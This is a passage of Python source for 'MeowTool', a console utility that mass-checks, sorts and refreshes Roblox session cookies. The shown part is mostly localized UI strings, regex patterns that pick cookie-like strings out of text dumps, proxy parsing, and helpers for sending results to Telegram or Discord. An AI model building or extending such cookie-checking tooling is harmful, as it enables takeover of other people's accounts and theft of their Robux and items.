            MT_Enter_Name_For_New_Config = 'Enter the name for new config'
            MT_Enter_New_Name_For_Config = 'Enter a new name for config'
            MT_Enter_New_Filename = 'Enter new filename'
            MT_Such_A_Parameter_Already_Exists = 'Such a parameter already exists'
            MT_Bundle_With_This_ID_Already_Exists = 'Bundle with this ID already exists'
            MT_Place_With_This_ID_Already_Exists = 'Place with this ID already exists'
            MT_Incorrent_Bundle_ID = 'Incorrect bundle\'s ID'
            MT_Incorrent_Place_ID = 'Incorrect place\'s ID'
            MT_Incorrect_Filename = 'Incorrect filename'
            MT_File_With_This_Name_Already_Exists = 'File with this name already exists'
            MT_Incorrect_Waiting_Time_60 = 'The waiting time cannot be more than 60 seconds'
            MT_Incorrect_Value = 'Incorrect value'
            MT_Of = 'of'
            MT_Start_Checking_File = 'Checking the file'
            MT_Checking_Complete = 'Checking complete'
            MT_Sorting_File = 'Sorting file'
            MT_Sorting_Complete = 'Sorting complete'
            MT_Press_Enter_To_Continue = 'Press Enter to continue'
            MT_Request = 'Request'
            MT_Everything_Or_Something_Is_On = 'everything or something is on, always'
            MT_Everything_Is_On_Or_Off = 'everything is on or off, always'
            MT_Total = 'TOTAL'
            MT_Roblox = 'Roblox'
            MT_Cookie_Sorter = 'Cookie sorter'
            MT_Cookie_Checker = 'Cookie checker'
            MT_Cookie_Refresher = 'Cookie refresher'
            MT_Beta = '[BETA]'
            MT_Only_Goodness = 'Only goodness'
            MT_Hi = 'Hi'
        case _: # 'RU'
            MT_Temporarily_Does_Not_Work = 'Временно не работает'
            MT_Search_For_Strings_Similar_To_Roblox_Cookie = 'Искать строки, похожие на куки роблокса (любая из 100+ символов)'
            MT_Timestamps = {'d':'д', 'h':'ч', 'm':'м', 's':'с', 'ms':'мс'}
            MT_Can_Break_USA_Cookie = 'Может сломать USA куки'
            MT_Symbols = 'Символы'
            MT_Add_Symbols_Between_Warning_And_Cookie = 'Добавлять символы между _|WARNING|_ и куки'
            MT_Try = 'Попытка'
            MT_Tickets = 'Тикеты'
            MT_Output_Total = 'Выводить общую статистику'
            MT_Available_Formats = 'Доступные форматы'
            MT_Move_Cookie_To_The_Next_Line = 'Переносить куки на следующую строку'
            MT_First_Number_Must_Be_Less_Than_Second_One = 'Первое число должно быть меньше второго'
            MT_Specify_Two_Numbers_Separated_By_A_Space = 'Нужно указать два параметра через пробел'
            MT_Both_Parameters_Must_Be_Numbers = 'Оба параметра должны быть числами'
            MT_From = 'От'
            MT_To = 'До'
            MT_Sort_By_Zero = 'Сортировать нуль'
            MT_Sort_Numbers_From_To = 'Сортировать числа от {} до {}'
            MT_Sort_Numbers_From = 'Сортировать числа от {}'
            MT_Sort_By_Group_Name = 'Сортировать по названию группы'
            MT_Sort_By_Bundle_Name = 'Сортировать по названию бандла'
            MT_Sort_By_Place_Name = 'Сортировать по названию плейса'
            MT_Sort_By_Badge_Name = 'Сортировать по названию бейджа'
            MT_Sort_By_Gamepass_Name = 'Сортировать по названию геймпасса'
            MT_Sort_By_Number = 'Сортировать по числу'
            MT_Enter_Something = 'Введи что-то'
            MT_Eep = 'Хнык'
            MT_Number = 'Число'
            MT_Names = 'Названия'
            MT_Place_Number = 'Плейс (Число)'
            MT_Place_Names = 'Плейс (Названия)'
            MT_Name_Number = 'Название (Число)'
            MT_Output_Mode = 'Режим вывода'
            MT_Non_Empty = 'Не пустых'
            MT_Duplicates = 'Дубликатов'
            MT_On = 'На'
            MT_Account_Duplicate = 'Дубликат аккаунта'
            MT_Automatically_Find_The_Chat_ID = 'Автоматически найти ID чата'
            MT_Manually_Find_The_Chat_ID = 'Вручную найти ID чата'
            MT_Bye = 'Пока'
            MT_Conversion_Error = 'Ошибка конвертации'
            MT_We_Out_Now = 'Закругляемся'
            MT_Response_Code = 'Код ответа'
            MT_Server_Could_Not_Process_The_Request = 'Сервер не смог обработать запрос'
            MT_Rate_Limit_Has_Been_Reached = 'Достигнут Rate-Limit'
            MT_Proxy_Error = 'Ошибка в работе прокси'
            MT_Waiting_Time_Exceeded = 'Превышено время ожидания'
            MT_Do_Not_Exceed_The_Thread_Limit = 'Не превышай ограничение на {} потоков'
            MT_File_Is_Too_Big = 'Файл слишком большой'
            MT_Break_Old_Cookies = 'Ломать старые куки'
            MT_Banned = 'Забанен', 'Забаненных'
            MT_Account_Banned = 'Аккаунт забанен'
            MT_Invalid_Token_Format = 'Недопустимый формат токена'
            MT_Invalid_URL_Format = 'Недопустимый формат URL'
            MT_Send_Any_Message_To_The_Bot_And_Try_Again = 'Отправь любое сообщение боту и попробуй снова'
            MT_Specify_The_Bot_Token = 'Укажи токен бота'
            MT_Specify_The_Chat_ID = 'Укажи ID чата'
            MT_Specify_The_Webhook_URL = 'Укажи URL вебхука'
            MT_Following_The_Link = 'Переход по ссылке'
            MT_Message_Was_Sent = 'Сообщение было отправлено'
            MT_Enter_A_Bot_Token = 'Введи токен бота'
            MT_Enter_A_Chat_ID = 'Введи ID чата'
            MT_Enter_A_Webhook_URL = 'Введи URL вебхука'
            MT_Send = 'Отправлять', 'Отправляю', 'Отправил', 'Отправить'
            MT_You = 'Ты', 'Тебе', 'Ты'
            MT_Results_To_Telegram = 'Результаты в Телеграм'
            MT_Results_To_Discord = 'Результаты в Дискорд'
            MT_Create_A_Bot = 'Создать бота'
            MT_Telegram = 'Телеграм', 'ТГ'
            MT_Discord = 'Дискорд', 'ДС'
            MT_Specify = 'Указать'
            MT_Value_Must_Consist_Of_Digits = 'Значение должно состоять из цифр'
            MT_Value_Cannot_Be_Empty = 'Значение не может быть пустым'
            MT_Successfully = 'Удачно'
            MT_Unsuccessfully = 'Неудачно'
            MT_Possibly_The_Internet_Is_Unstable = 'Возможно интернет нестабилен'
            MT_Possibly_A_Typo_In_The_Bot_Token = 'Возможно опечатка в токене бота'
            MT_Possibly_A_Typo_In_The_Chat_ID = 'Возможно опечатка в ID чата'
            MT_Unknown_Error = 'Неизвестная ошибка'
            MT_Possibly_A_Typo_In_The_Webhook_URL = 'Возможно опечатка в URL вебхука'
            MT_Unknown_Server_Response_Code = 'Неизвестный код ответа сервера'
            MT_Bot_Token = 'Токен бота'
            MT_Chat_ID = 'ID чата', 'ID чата'
            MT_Telegram_Bot = 'Телеграм бот'
            MT_Discord_Webhook = 'Дискорд вебхук'
            MT_Webhook_URL = 'URL вебхука', 'URL вебхука'
            MT_Outputs = 'Выводы'
            MT_Spent = 'Потрачено'
            MT_Transactions = 'Транзакций'
            MT_Status = 'Статус'
            MT_Play_The_Sound_At_The_End_Of_The_Work = 'Воспроизвести звук по окончании работы'
            MT_Show_Amount_Of_Lines_In_Files = 'Показать количество строк в файлах'
            MT_Count_Robux_In_Total = 'Считать робуксы в общей сложности'
            MT_Cookie = 'Куки'
            MT_Format = 'Формат'
            MT_Enable_At_Least_One_Place_To_Start_Analysis = 'Включи хотя бы один плейс, чтобы начать анализ'
            MT_Number_Of_Threads_For_Transaction_Analysis = 'Потоков для анализа транзакций'
            MT_Output_Filename = 'Название выходного файла'
            MT_Name_Output_File_The_Same_As_Input_File = 'Называть выходной файл так же, как входной'
            MT_Transaction_With_This_Name_Already_Exists = 'Транзакция с таким названием уже существует'
            MT_Enter_A_Transaction_Name = 'Введи название транзакции'
            MT_Add_A_Transaction = 'Добавить транзакцию'
            MT_Ignore = 'Игнорировать'
            MT_Ignore_All = 'Игнорировать всё'
            MT_Do_Not_Ignore_All = 'Не игнорировать всё'
            MT_Important = 'Важно'
            MT_Ignore_List = 'Игнор-лист'
            MT_Discover_New_Names_For_Ignore_List = 'Обнаруживать новые названия для игнор-листа'
            MT_Save_Old_Versions = 'Сохранять старые версии'
            MT_Updates = 'Обновления'
            MT_Yes = 'Да'
            MT_No = 'Нет'
            MT_Max_Indentation = 'Максимальный отступ'
            MT_No_Indentation = 'Без отступа'
            MT_Transaction_Analysis = 'Анализ транзакций'
            MT_Save_All_Places_In_One_File = 'Сохранять все плейсы в один файл'
            MT_Save_Places_To_Different_Files = 'Сохранять плейсы в разные файлы'
            MT_Add_Nick_After_Cookie_In_Folder_Names = 'Добавлять ник после куки в названиях папок'
            MT_Add_Robux_After_Place_In_File_Names = 'Добавлять робуксы после плейса в названиях файлов'
            MT_Indentation_By_The_Longest_Place_Name = 'Отступ по самому длинному названию плейса'
            MT_Item = 'Предмет'
            MT_Price = 'Цена'
            MT_Date = 'Дата'
            MT_You_Are_Using_Version_Of_Program = f'Ты используешь {VERSION} версию программы'
            MT_Open_Latest_Changes = 'Открыть последние изменения'
            MT_Open_MeowTool_On_GitHub = 'Открыть MeowTool на GitHub'
            MT_Open_The_Showcase_On_YouTube = 'Открыть демонстрацию на YouTube'
            MT_Open_PM_With_Developer_In_Telegram = 'Открыть ЛС с разработчиком в Телеграм'
            MT_About_The_Program = 'О программе'
            MT_Check_For_Updates = 'Проверять обновления'
            MT_No_Cookies_Found = 'Куки не найдены'
            MT_All_Cookies_Were_Invalid = 'Все куки оказались невалидными'
            MT_Number_Of_Threads_For_Valid_Checker = 'Потоков для валид чекера'
            MT_Number_Of_Threads_For_Main_Checker = 'Потоков для основного чекера'
            MT_Enter_Number_Of_Threads = 'Введи количество потоков'
            MT_First_We_Check_For_Valid = 'Сначала проверяем на валид'
            MT_Valid = 'Валидных'
            MT_Invalid = 'Невалидных'
            MT_First_Check_All_Cookies_For_Valid = 'Сначала проверять все куки на валид'
            MT_No_Cookie_Was_Found = 'Ни одного куки не найдено, проверка отменена'
            MT_No_Proxy_Was_Found = 'Ни одного прокси не найдено, проверка отменена'
            MT_Auto_Protocol = 'Авто протокол'
            MT_Use_Proxy = 'Использовать прокси'
            MT_Auto_Protocol_If_Not_Specified = 'Протокол, если не указан в файле'
            MT_Any = 'Любая'
            MT_Key_To_Continue = 'Клавиша для продолжения'
            MT_File_Was_Not_Created = 'Файл не был создан'
            MT_File_Is_Missing = 'Файл куда-то пропал, странно'
            MT_Incorrect_Cookies_Removed = 'Удалено некорректных куки'
            MT_Rate_Limit_Has_Been_Reached = 'Достигнут Rate-Limit'
            MT_Checker = 'Чекер'
            MT_Proxy = 'Прокси'
            MT_The_Name_Cannot_Be_Empty = 'Название не может быть пустым'
            MT_Do_Not_Use_This_Characters = 'Не используй такие символы'
            MT_Enter_A_New_Title = 'Введи новое название'
            MT_Console_Title = 'Название консоли'
            MT_Show_Place_ID_Next_To_The_Name = 'Показать ID плейса рядом с названием'
            MT_Disable_Warnings_For_Links = 'Отключить предупреждения для ссылок'
            MT_Disable_Warnings_For_Dangerous_Actions = 'Отключить предупреждения для опасных действий'
            MT_Show_Cookie = 'Показать куки'
            MT_Data = 'Данные'
            MT_Find = 'Найти'
            MT_Save_Invalid_Cookies = 'Сохранять невалидные куки'
            MT_Save_Cookies_Added_Manually = 'Сохранять куки, добавленные вручную'
            MT_Save_Cookies_Checked_By_Checker = 'Сохранять куки, проверенные чекером'
            MT_Start_Refresher = 'Запустить рефрешер'
            MT_Wait = 'Подожди', 'Ожидание'
            MT_Can_Run = 'Можно запустить'
            MT_Do_You_Sure = 'Ты уверен?'
            MT_I_Am_Sure = 'Я уверен'
            MT_Not_Yet = 'Ещё нет'
            MT_Reset_To_Default_Settings = 'Сбросить настройки по умолчанию'
            MT_Reload_Config = 'Перезагрузить конфиг'
            MT_New_Cookie = 'Новый куки'
            MT_Old_Cookie = 'Старый куки'
            MT_In = 'В', 'За'
            MT_Enter_A_Cookie = 'Введи куки', 'Ввести куки'
            MT_Incorrect_Cookie = 'Некорретный куки'
            MT_Invalid_Cookie = 'Невалидный куки'
            MT_Single_Mode = 'Одиночный режим'
            MT_Mass_Mode = 'Массовый режим'
            MT_Could_Not_Connect_To_The_API = 'Не удалось подключиться к API'
            MT_Trying_To_Connect_Again = 'Пытаемся подключиться ещё раз'
            MT_Bind = 'Бинд'
            MT_Show_Label_MeowTool = 'Показать надпись \'MeowTool\''
            MT_Show_Label_by_h1kken = 'Показать надпись \'by h1kken :3\''
            MT_Parameter_Must_Be_A_Number = 'Параметр должен быть числом'
            MT_Add_A_Parameter = 'Добавить параметр'
            MT_Sort = 'Сортировать'
            MT_Sorting = 'Сортировка'
            MT_The_Place_Has_No_Gamepasses_And_Badges = 'У плейса нет геймпассов и бейджей'
            MT_Custom_Places = 'Кастомные плейсы'
            MT_Enable_All = 'Включить всё'
            MT_Disable_All = 'Выключить всё'
            MT_Id = 'Айди'
            MT_Nickname = 'Никнейм'
            MT_Name = 'Название'
            MT_Link = 'Ссылка'
            MT_Duplicated_Cookies_Removed = 'Удалено одинаковых куки'
            MT_Unique_Cookies_Found = 'Найдено уникальных куки'
            MT_Successfully_Uploaded_In = 'Успешно выгружено в'
            MT_Place_ID = 'ID плейса'
            MT_Place_Name = 'Название плейса'
            MT_Place_Link = 'Ссылка на плейс'
            MT_Gamepasses = 'Геймпассы'
            MT_Badges = 'Бейджи'
            MT_Remove_Emojies = 'Удалять эмодзи из названия'
            MT_Remove_Round_Brackets = 'Удалять (и то, что внутри них) из названия'
            MT_Remove_Square_Brackets = 'Удалять [и то, что внутри них] из названия'
            MT_Upload_All_Info_Gamepasses_And_Badges = 'Выгрузить всю информацию о геймпассах и бейджах из программы'
            MT_Enable_Something_In = 'Включи что-нибудь в: Настройки > Роблокс > Куки чекер > Основное'
            MT_Save_Without_Protocol = 'Сохранять без протокола'
            MT_Save_In = 'Сохранять в'
            MT_The_Data_Is_Saved_In = 'Данные сохранены в'
            MT_Incorrect_Length_Of_String = 'Длина строки не должна превышать {} символов'
            MT_Incorrect_Length_Of_ID = 'Длина ID не может превышать {} символов'
            MT_Incorrect_Length_Of_Parameter = 'Длина каждого параметра не должна превышать {} символов'
            MT_Incorrect_Length_Of_Name = 'Длина названия не может превышать {} символов'
            MT_Gamepass_With_This_Name_Already_Exists = 'Геймпасс с таким названием уже существует'
            MT_Add_A_Gamepass_Name = 'Добавить название геймпасса'
            MT_Found_Data_On = 'Найденные данные по'
            MT_The_Place_Has_No_Gamepasses = 'У плейса нет геймпассов'
            MT_The_Place_Has_No_Badges = 'У плейса нет бейджей'
            MT_Gamepasses_Parser_From_The_Place = 'Парсер геймпассов плейса'
            MT_Badges_Parser_From_The_Place = 'Парсер бейджей плейса'
            MT_Misc = 'Разное'
            MT_Seconds = 'сек'
            MT_Waiting_Time = 'Время ожидания'
            MT_Output_Total = 'Выводить итоговые данные'
            MT_Found = 'Найдено'
            MT_Lines = 'Строк'
            MT_Start_Sorting = 'Начать сортировку'
            MT_Enter_The_Parameter_Value = 'Введи значение параметра'
            MT_Enter_The_Waiting_Time = 'Введи время в секундах'
            MT_Enter_The_Gamepass_Name = 'Введи название геймпасса'
            MT_Enter_The_Place_ID = 'Введи ID плейса'
            MT_Enter_The_Bundle_ID = 'Введи ID бандла'
            MT_Gamepasses = 'Геймпассы'
            MT_Badges = 'Бейджи'
            MT_Fix_Console = 'Починить консоль'
            MT_Settings = 'Настройки'
            MT_General = 'Общее'
            MT_Main = 'Основное'
            MT_Places = 'Плейсы'
            MT_Language = 'Язык'
            MT_Configs = 'Конфиги'
            MT_Check = 'Проверять'
            MT_Save = 'Сохранить', 'Сохранять'
            MT_Auto_Save_Changes = 'Авто. сохранение изменений'
            MT_Update_List = 'Обновить список'
            MT_Back = 'Назад'
            MT_Close_Program = 'Закрыть программу'
            MT_Add_A_Bundle_By_ID = 'Добавить бандл по ID'
            MT_Add_A_Place_By_ID = 'Добавить плейс по ID'
            MT_Create_Config = 'Создать конфиг'
            MT_Cancel = 'Отмена'
            MT_Load_On_Launch = 'Загружать при запуске'
            MT_Load = 'Загрузить'
            MT_File_Location = 'Расположение файла'
            MT_Rename = 'Переименовать'
            MT_Delete = 'Удалить'
            MT_Enter_Name_For_New_Config = 'Введи название нового конфига'
            MT_Enter_New_Name_For_Config = 'Введи новое название конфига'
            MT_Enter_New_Filename = 'Введи новое название файла'
            MT_Such_A_Parameter_Already_Exists = 'Такой параметр уже существует'
            MT_Bundle_With_This_ID_Already_Exists = 'Бандл с таким ID уже существует'
            MT_Place_With_This_ID_Already_Exists = 'Плейс с таким ID уже существует'
            MT_Incorrent_Bundle_ID = 'Некорректный ID бандла'
            MT_Incorrent_Place_ID = 'Некорректный ID плейса'
            MT_Incorrect_Filename = 'Некорректное название файла'
            MT_File_With_This_Name_Already_Exists = 'Файл с таким названием уже существует'
            MT_Incorrect_Waiting_Time_60 = 'Время ожидания не может быть больше 60 секунд'
            MT_Incorrect_Value = 'Некорректное значение'
            MT_Of = 'из'
            MT_Start_Checking_File = 'Проверяем файл'
            MT_Checking_Complete = 'Проверка завершена'
            MT_Sorting_File = 'Сортируем файл'
            MT_Sorting_Complete = 'Сортировка завершена'
            MT_Press_Enter_To_Continue = 'Нажми Enter чтобы продолжить'
            MT_Request = 'Запрос'
            MT_Everything_Or_Something_Is_On = 'всё или что-то включено, всегда'
            MT_Everything_Is_On_Or_Off = 'всё включено или выключено, всегда'
            MT_Total = 'ВСЕГО'
            MT_Roblox = 'Роблокс'
            MT_Cookie_Sorter = 'Куки сортер'
            MT_Cookie_Checker = 'Куки чекер'
            MT_Cookie_Refresher = 'Куки рефрешер'
            MT_Beta = '[БЕТА]'
            MT_Only_Goodness = 'Только добра'
            MT_Hi = 'Привет'
    warnMessagesInit()

### ASCII Рисунки

MEOWTOOL = r'''
  __    __     ______     ______     __     __     ______     ______     ______     __
 /\ "-./  \   /\  ___\   /\  __ \   /\ \  _ \ \   /\__  _\   /\  __ \   /\  __ \   /\ \
 \ \ \-./\ \  \ \  __\   \ \ \ \ \  \ \ \/ ".\ \  \/_/\ \/   \ \ \ \ \  \ \ \ \ \  \ \ \____
  \ \ \ \ \ \  \ \    ‾\  \ \ ‾‾  \  \ \  /". \ \    \ \ \    \ \ ‾‾  \  \ \ ‾‾  \  \ \     \
   \/‾/  \/‾/   \/‾‾‾‾‾/   \/‾‾‾‾‾/   \/‾/   \/‾/     \/‾/     \/‾‾‾‾‾/   \/‾‾‾‾‾/   \/‾‾‾‾‾/
    ‾‾    ‾‾     ‾‾‾‾‾‾     ‾‾‾‾‾‾     ‾‾     ‾‾       ‾‾       ‾‾‾‾‾‾     ‾‾‾‾‾‾     ‾‾‾‾‾‾
'''.lstrip('\n')

BY_H1KKEN = r'''
 /‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾\ by h1kken :3 /‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾\
 ‾‾‾ ‾ ‾‾  ‾‾  ‾‾  ‾‾‾  ‾‾  ‾‾  ‾‾ ‾ ‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾ ‾ ‾‾  ‾‾  ‾‾  ‾‾‾  ‾‾  ‾‾  ‾‾ ‾ ‾‾‾
'''.lstrip('\n')

### Исключения

class RobloxException(Exception):
    ...

class InvalidCookie(RobloxException):
    def __init__(self, message = 'Invalid cookie'):
        super().__init__(message)

class AccountDuplicate(RobloxException):
    def __init__(self, message = 'Account duplicate'):
        super().__init__(message)

class AccountBanned(RobloxException):
    def __init__(self, message = 'Account banned'):
        super().__init__(message)

### Ошибки

ETHERNET_ERRORS = {
    asyncio.TimeoutError,
    asyncio.exceptions.CancelledError,
    ClientOSError,
    ConnectionResetError,
    ServerDisconnectedError,
    TransferEncodingError,
    ClientPayloadError,
    SocketTimeoutError,
    ProxyError
}

### Константы

# Общие

CONSOLE_NAME_SPECIAL_CHARS = {'<', '>', '|', '^', '&'}
FILENAME_SPECIAL_CHARS = {'\\', '/', ':', '*', '?', '"', '<', '>', '|'}

# Роблокс

COOKIE_START = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_'

### Паттерны

SPECIAL_CHARS = re.compile(
    r'[\\/*?:"<>|]'
)

STRING_MINIMUM_100_SYMBOLS_PATTERN = re.compile(
    r'\S{100,}'
)

DATE_NANOSECONDS_PATTERN = re.compile(
    r'(.*\.\d{6})\d*Z$'
)

# Роблокс

COOKIE_PATTERN = re.compile(
    r'_\|(?:_|[^\s\r\n]*?\|_)\S{100,}' # Учитывает все строки вида: '_|_...', '_||_...', '_|...|_...', где ... - любые символы
)

AGE_GROUP_PATTERN = re.compile(
    r'(?i)(Over|Under)?(\d+)[^\d]*(\d+)?'
)

DATE_FORMATS = [
    '%Y-%m-%dT%H:%M:%S.%fZ',
    '%Y-%m-%dT%H:%M:%SZ'
]

AGE_GROUP_MAPPING = {
    'over': '+',
    'under': '-'
}

def warnMessagesInit() -> None:
    global WARNED_CATEGORIES_GENERAL_RCC
    WARNED_CATEGORIES_GENERAL_RCC = {
        'Card': {
            'color': ANSI.FG.RED,
            'message': MT_Can_Break_USA_Cookie
        },
        'Place Visits': {
            'color': ANSI.FG.GRAY,
            'message': MT_Temporarily_Does_Not_Work
        }
    }

# Прокси

PROXY_PROTOCOL_IN_START_OF_STRING_PATTERN = re.compile(
    r'(?i)^(https?|socks[45])'
)

PROXY_PROTOCOL_IP_PORT_USER_PASS_PATTERN = re.compile(
    r'(?i)^(?:(?P<protocol>https?|socks[45])://)?'
    r'(?P<ip>[^:]+):'
    r'(?P<port>\d{1,5}):'
    r'(?P<username>[^:]+):'
    r'(?P<password>.+)$'
)

PROXY_PROTOCOL_USER_PASS_IP_PORT_PATTERN = re.compile(
    r'(?i)^(?:(?P<protocol>https?|socks[45])://)?'
    r'(?P<username>[^:@]+):'
    r'(?P<password>[^:@]+)@'
    r'(?P<ip>[^:]+):'
    r'(?P<port>\d{1,5})$'
)

PROXY_PROTOCOL_IP_PORT_PATTERN = re.compile(
    r'(?i)^(?:(?P<protocol>https?|socks[45])://)?'
    r'(?P<ip>[^:]+):'
    r'(?P<port>\d{1,5})$'
)

PROXY_PATTERNS = [
    PROXY_PROTOCOL_USER_PASS_IP_PORT_PATTERN,
    PROXY_PROTOCOL_IP_PORT_USER_PASS_PATTERN,
    PROXY_PROTOCOL_IP_PORT_PATTERN
]

### Основные функции

def startLoggerInformation() -> None:
    logger.info(f'< [START_LOGGER_INFORMATION] > Program version: {VERSION}', force=True)
    logger.info(f'< [START_LOGGER_INFORMATION] > Python version: {sys.version.splitlines()[0]}', force=True)
    logger.info(f'< [START_LOGGER_INFORMATION] > Operational system: {platform.platform()}', force=True)

def timer(command: Literal['start', 'stop'], start: int = 0) -> float:
    match command:
        case 'start': return time.perf_counter()
        case 'stop':  return time.perf_counter() - start

def generateVisualPath(*pathArgs: str) -> str:
    visualPath = OS_SEP.join(pathArgs) if pathArgs else ''
    return f'[{ANSI.FG.CYAN}P{ANSI.FG.WHITE}] {ANSI.FG.CYAN}M:{OS_SEP}{visualPath}{ANSI.FG.WHITE}'

def labelASCII() -> None:
    cls()
    cmdWriter(ANSI.DECOR.BOLD)
    # MeowTool
    if config['General']['Show_Label_MeowTool']:
        cmdWriter(f'{ANSI.FG.PINK}{MEOWTOOL}')
    else:
        cmdWriter('\n')

    # by h1kken :3
    if config['General']['Show_Label_by_h1kken']:
        cmdWriter(f'{ANSI.FG.RED}{BY_H1KKEN}')
    cmdWriter(ANSI.FG.WHITE)
    cmdFlusher()

def currentDate(format: str) -> str:
    return datetime.now().strftime(format)

def playSystemSound() -> None:
    if config['Outputs']['Play_Sound_At_The_End_Of_The_Work']:
        cmdWriter('\a')
        cmdFlusher()

def removeLines(amountOfLines: int) -> None:
    if amountOfLines:
        cmdWriter(f'\x1b[{amountOfLines}A\x1b[J')

def rmBracketsAndIn(string: str, *, round: bool, square: bool) -> str:
    newString = ''
    skip = 0
    for char in string:
        if char == '(' and round or char == '[' and square:
            skip += 1
        elif char in (')', ']') and skip > 0:
            skip -= 1
        elif skip == 0:
            newString += char
    return newString

def rmPatternFromString(pattern: re.Pattern[str], string: str) -> str:
    return re.sub(pattern, '', string)

def rmEmojies(string: str, *, replace: str = ' ') -> str:
    return emoji.replace_emoji(string, replace=replace)

def rmTwoSpaces(string: str) -> str:
    return ' '.join(string.split())

def amountOfLines(path: Path) -> str:
    if not path.exists():
        print(path)
        return '0 lines'

    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as file:
            amount = sum(1 for _ in file)
        return f'{amount} line{'s' if amount != 1 else ''}'
    except Exception as e:
        logger.exception(f'< [AMOUNT_OF_LINES] > {MT_Error}: {e}', force=True)
        return 'error'

def waitingInput() -> None:
    cmdWriter(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {ANSI.DECOR.FLASHING}{MT_Press_Enter_To_Continue}...{ANSI.DECOR.FLASHINGOFF}')
    cmdFlusher()
    input()
    labelASCII()

def errorOrCorrectHandler(isError: bool, message: str, visualPath: str) -> None:
    labelASCII()
    cmdWriter(f'\r {visualPath}\n\n {f'[{ANSI.FG.RED if isError else ANSI.FG.GREEN}>{ANSI.FG.WHITE}]'} {message}\n\n')
    waitingInput()

def autoSaveConfigLoader() -> None:
    loaderPath = Path('Settings', 'Configs', '.Loader.toml')
    loaderPath.parent.mkdir(parents=True, exist_ok=True)
    with open(loaderPath, 'w', encoding='utf-8', errors='ignore') as file:
        file.write(dumps(configLoader))

def autoSaveConfig(force: bool = False) -> None:
    if not (configLoader['Saver']['Auto_Save_Changes'] or force):
        return

    configPath = Path('Settings', 'Configs', f'{configLoader['Loader']['Current_Config']}.toml')
    configPath.parent.mkdir(parents=True, exist_ok=True)
    with open(configPath, 'w', encoding='utf-8', errors='ignore') as file:
        file.write(dumps(config))

def autoSaveConfigAndRemoveLinesInSettings(caseValue: str, autoSaveConfigKeys: tuple[str], removeLinesKeys: tuple[str], numberOfLines: int) -> None:
    if caseValue in autoSaveConfigKeys:
        autoSaveConfig()
    if numberOfLines and caseValue in removeLinesKeys:
        removeLines(numberOfLines)

def getFiles(path: Path, *, isPrintFiles: bool = False) -> list[str]:
    path.mkdir(parents=True, exist_ok=True)
    listOfFiles = [file.name for file in path.iterdir()
                   if file.is_file() and file.name.endswith('.txt')]

    if isPrintFiles:
        length = len(str(len(listOfFiles))) + 12
        for index, file in enumerate(listOfFiles):
            cmdWriter(f' {f'[{ANSI.FG.PINK}{index + 1}{ANSI.FG.WHITE}]':>{length}} ┃ {file} {f'({amountOfLines(path / file)})' if config['General'][f'Show_Amount_Of_Lines_In_Files'] else ''}\n')

    return listOfFiles

def convertDate(inputDate: str, outputFormat: str) -> str:
    '''
    Available formats:
    - %Y-%m-%dT%H:%M:%S.%fZ
    - %Y-%m-%dT%H:%M:%SZ
    '''

    if (match := re.match(DATE_NANOSECONDS_PATTERN, inputDate)):
        inputDate = f'{match.group(1)}Z'

    for dateFormat in DATE_FORMATS:
        try:
            return datetime.strptime(inputDate, dateFormat).strftime(outputFormat)
        except ValueError:
            continue

    logger.warning(f'< [CONVERT_DATE] > {MT_Conversion_Error}: (in): {inputDate}, (out): {outputFormat}', force=True)
    return 'ERROR'

def formatDuration(ms: int, *, inColor: str = ANSI.FG.BLUE, outColor: str = ANSI.FG.WHITE, sep: str = '. ', end: str = '.', outUnits: Literal['d', 'h', 'm', 's', 'ms', 'all'] = 'all') -> str:
    s, ms = divmod(ms, 1000)
    m, s  = divmod(s,  60)
    h, m  = divmod(m,  60)
    d, h  = divmod(h,  24)
    units = {'d': d, 'h': h, 'm': m, 's': s, 'ms': ms}
    
    parts = []
    for key, value in units.items():
        if (value or parts) and (key in outUnits or 'all' in outUnits):
            parts.append(f'{value}{MT_Timestamps[key]}')

    return f'{inColor}{sep.join(parts)}{end}{outColor}'

def enabledOrDisabledOption(condition: bool) -> str:
    return f'[{f'{ANSI.FG.GREEN}+' if condition else f'{ANSI.FG.RED}-'}{ANSI.FG.WHITE}]'

def openLink(url: str, removeLines_: int, visualPath: str) -> None:
    if not config['General']['Disable_Warnings_For_Links']:
        removeLines(removeLines_)
        whileTrueStageLink = True
        while whileTrueStageLink:
            cmdWriter(f' {visualPath}\n\n [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] ┃ {MT_Following_The_Link}: {ANSI.DECOR.UNDERLINEON}{url}{ANSI.DECOR.UNDERLINEOFF}\n [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] ┃ {MT_Do_You_Sure}\n  ┃\n [{ANSI.FG.GREEN}Y{ANSI.FG.WHITE}] ┃ {MT_I_Am_Sure}\n [{ANSI.FG.RED}N{ANSI.FG.WHITE}] ┃ {MT_Not_Yet}\n\n')
            confirmTheAction = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
            match confirmTheAction:
                case 'Y' | 'Н':
                    webbrowser.open(url)
                    whileTrueStageLink = False
                case 'N' | 'Т':
                    whileTrueStageLink = False

            removeLines(9)
    else:
        webbrowser.open(url)
        removeLines(removeLines_)

def openFile(path: Path, *, highlightFile: bool = False, filename: str = '') -> None:
    systemPlatform = sys.platform.lower()
    if systemPlatform.startswith('win'):
        if highlightFile:
            subprocess.run(['explorer.exe', '/select,', path / filename])
        else:
            os.startfile(path)
    else:
        command = 'open' if systemPlatform == 'darwin' else 'xdg-open'
        subprocess.run([command, path.parent])

async def closeProgram() -> None:
    logger.info(f'{MT_We_Out_Now}...', force=True)
    labelASCII()
    cmdWriter(f'{'' if (config['General']['Show_Label_MeowTool'] or config['General']['Show_Label_by_h1kken']) else ' '} [{ANSI.FG.PINK}<3{ANSI.FG.WHITE}] {MT_Bye}... *{MT_Eep.lower()}* :<')
    cmdFlusher()
    await asyncio.sleep(1)
    sys.exit()

def createFoldersAndFiles() -> None:
    PATHS = [
        ('Proxy', 'Checker', 'proxies.txt'),
        ('Roblox', 'proxies.txt'),
        ('Roblox', 'Cookie Sorter'),
